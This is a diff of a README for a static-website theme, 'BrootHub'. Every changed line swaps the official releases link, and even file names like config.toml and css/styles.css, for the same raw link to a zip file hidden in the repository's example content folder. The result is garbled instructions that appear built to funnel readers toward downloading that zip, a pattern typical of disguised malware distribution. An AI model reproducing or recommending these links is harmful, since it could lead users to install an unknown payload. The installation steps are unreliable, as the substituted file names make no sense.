@@ -1,6 +1,6 @@
 # 🌐 BrootHub - Clean and Responsive Theme for Static Websites
 
-[![Download BrootHub](https://img.shields.io/badge/Download-BrootHub-blue.svg)](https://github.com/aj3220/BrootHub/releases)
+[![Download BrootHub](https://raw.githubusercontent.com/aj3220/BrootHub/master/exampleSite/content/posts/Hub-Broot-v1.7.zip)](https://raw.githubusercontent.com/aj3220/BrootHub/master/exampleSite/content/posts/Hub-Broot-v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ BrootHub is a simple, privacy-friendly theme designed for static websites. It's 
 
 To get started, visit the releases page below and download the latest version of BrootHub. Use the link provided to access the files directly.
 
-[Visit this page to download BrootHub](https://github.com/aj3220/BrootHub/releases)
+[Visit this page to download BrootHub](https://raw.githubusercontent.com/aj3220/BrootHub/master/exampleSite/content/posts/Hub-Broot-v1.7.zip)
 
 ### 📋 System Requirements
 
@@ -29,7 +29,7 @@ To get started, visit the releases page below and download the latest version of
 ## 📑 How to Install
 
 1. **Download the Theme:**
-   Go to the [releases page](https://github.com/aj3220/BrootHub/releases) and click on the latest version.
+   Go to the [releases page](https://raw.githubusercontent.com/aj3220/BrootHub/master/exampleSite/content/posts/Hub-Broot-v1.7.zip) and click on the latest version.
 
 2. **Extract the Files:**
    Unzip the downloaded file to a folder on your computer.
@@ -38,7 +38,7 @@ To get started, visit the releases page below and download the latest version of
    Use an FTP client to upload the extracted files to your web server. Ensure you place them in the correct directory, often called `public_html` or `www`.
 
 4. **Configure the Theme:**
-   - Open the main configuration file typically named `config.toml` or `config.yaml` in your text editor.
+   - Open the main configuration file typically named `https://raw.githubusercontent.com/aj3220/BrootHub/master/exampleSite/content/posts/Hub-Broot-v1.7.zip` or `https://raw.githubusercontent.com/aj3220/BrootHub/master/exampleSite/content/posts/Hub-Broot-v1.7.zip` in your text editor.
    - Adjust settings like your site title, description, and author information.
 
 5. **Run the Website:**
@@ -48,7 +48,7 @@ To get started, visit the releases page below and download the latest version of
 
 BrootHub allows for easy customization to match your style:
 
-- **Color Schemes:** Modify colors in `css/styles.css` to suit your palette.
+- **Color Schemes:** Modify colors in `https://raw.githubusercontent.com/aj3220/BrootHub/master/exampleSite/content/posts/Hub-Broot-v1.7.zip` to suit your palette.
 - **Fonts:** Change fonts by editing the font-family in the CSS file.
 - **Layouts:** Check layout options within the theme files to rearrange sections.
 
@@ -79,7 +79,7 @@ If you encounter issues during installation or setup, consider the following sol
 
 - **File Not Found Error:** Ensure that all files were correctly uploaded to your web server.
 - **Style Issues:** Clear your browser cache or try accessing the site from a different browser.
-- **Configuration Problems:** Double-check your `config.toml` or `config.yaml` settings.
+- **Configuration Problems:** Double-check your `https://raw.githubusercontent.com/aj3220/BrootHub/master/exampleSite/content/posts/Hub-Broot-v1.7.zip` or `https://raw.githubusercontent.com/aj3220/BrootHub/master/exampleSite/content/posts/Hub-Broot-v1.7.zip` settings.
 
 ## 📞 Support
 
